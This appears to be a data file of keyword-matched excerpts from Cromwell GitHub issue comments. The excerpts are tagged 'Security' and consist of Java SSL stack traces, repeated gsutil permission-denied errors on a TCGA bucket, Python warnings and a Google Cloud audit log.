Security,".java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7807,secur,security,7807,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3512,access,access,3512,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4766,access,access,4766,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6020,access,access,6020,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7274,access,access,7274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8528,access,access,8528,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9782,access,access,9782,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11036,access,access,11036,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12290,access,access,12290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,".list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:13544,access,access,13544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Class cromwell.services.womtool.impl.WomtoolServiceInCromwellActor for service Womtool cannot be found in the class path.; 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:54); 	at cromwell.services.ServiceRegistryActor$.$anonfun$serviceNameToPropsMap$2(ServiceRegistryActor.scala:37); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:36); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; Caused by: java.lang.ClassNotFoundException,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:3981,Hash,HashMap,3981,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['Hash'],['HashMap']
Security,"/mccarroll-mocha; page_size: 100; requestMetadata:; callerIp: 64.112.179.105; callerSuppliedUserAgent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101; Firefox/80.0,gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T03:28:37.843325531Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T03:28:38.742413691Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T03:28:37.734190692Z'; ```. Sometimes like this instead:; ```; insertId: 1mk6qq6ek68fs; logName: projects/mccarroll-mocha/logs/cloudaudit.googleapis.com%2Fdata_access; protoPayload:; '@type': type.googleapis.com/google.cloud.audit.AuditLog; authenticationInfo:; principalEmail: google@broadinstitute.com; principalSubject: user:google@broadinstitute.com; authorizationInfo:; - granted: true; permission: iam.serviceAccounts.list; resource: projects/mccarroll-mocha; resourceAttributes: {}; methodName: google.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; requestMetadata:; callerIp: 69.173.70.180; callerSuppliedUserAgent: (gzip),gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T11:58:49.543410910Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T11:58:49.691467944Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T11:58:49.452628092Z'; ```. The principalEmail sometimes is `giulio@broadinstitute.org` and sometimes is `google@broadinstitute.com` so I am not sure what these requests are for.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080:1693,authoriz,authorizationInfo,1693,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080,1,['authoriz'],['authorizationInfo']
Security,"/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/_libs/__init__.py:4: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from .tslib import iNaT, NaT, Timestamp, Timedelta, OutOfBoundsDatetime; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/__init__.py:26: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (hashtable as _hashtable,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/dtypes/common.py:6: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos, lib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/util/hashing.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import hashing, tslib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/indexes/base.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (lib, index as libindex, tslib as libts,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/tseries/offsets.py:21: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; import pandas._libs.tslibs.offsets as liboffsets; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/ops.py:16: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos as libalgos, ops as libops; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/indexes/interval.py:32: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs.interval import (; /usr/lo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:1462,hash,hashing,1462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['hash'],['hashing']
Security,"0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) 